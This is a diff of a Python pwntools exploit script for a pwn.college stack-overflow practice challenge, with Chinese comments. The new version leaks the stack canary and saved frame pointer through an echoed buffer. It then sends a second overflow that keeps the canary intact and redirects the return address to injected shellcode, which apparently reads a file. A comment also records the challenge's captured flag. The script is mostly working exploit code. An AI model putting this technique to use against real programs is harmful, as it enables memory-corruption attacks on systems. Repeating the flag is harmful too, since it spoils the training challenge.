@@ -1,10 +1,11 @@
 from pwn import *
 
 # 需要自己写shellcode
+# 需要先泄露canary和rbp地址, 再计算出栈上数据位置, 最后返回到对应位置
+# pwn_college{0FWo4Ebne8BFxKLBlei0xz2MAVN.dlzMywiMxkzW}
 context(os='linux', arch='amd64',)#log_level='debug')
 
 def getshellcode():
-    ret_addr = p64(0x7fffffffe530)
     shellcode = b""
     shellcode += asm("xor al, al")
     shellcode += asm("mov al, 2")
@@ -26,16 +27,29 @@ def getshellcode():
     shellcode += asm("xor edi, edi")
     shellcode += asm("syscall")
     #shellcode += asm("")
-    # 19*8+ret_addr
-    shellcode += (19*8-len(shellcode))*b'A' + ret_addr
     return shellcode
 
 if __name__ == '__main__':
-    target_name = "./toddler1_level1_teaching1"
+    target_name = "./toddler1_level2_teaching1"
     io = process(target_name)
     io.recvuntil(b"size: ")
-    shellcode = getshellcode()
-    io.sendline(bytes(str(len(shellcode)), encoding='utf8'))
+    #shellcode = getshellcode()
+    io.sendline(bytes(str(9*8+1), encoding='utf8'))
     io.recvuntil(b"!\n")
-    io.sendline(shellcode)
+    # 第一次输入, 进行泄露
+    payload_0 = b"REPEATaa"+getshellcode()
+    payload_0 += (9*8-len(payload_0))*b'b'+b'c'
+    io.sendline(payload_0)
+    io.recvuntil(payload_0)
+    canary = b'\x00'+io.recv(7)
+    rbp = io.recv(6)+b'\x00\x00'
+    shellcode_addr = p64(int.from_bytes(rbp, 'little') - 120)
+    #print(shellcode_addr)
+    #input()
+    # 第二次输入, 覆盖ret到相对地址上
+    io.recvuntil(b"size: ")
+    io.sendline(bytes(str(12*8), encoding='utf8'))
+    io.recvuntil(b"!\n")
+    payload_1 = 9*8*b'A'+canary+8*b'B'+shellcode_addr
+    io.sendline(payload_1)
     io.interactive()
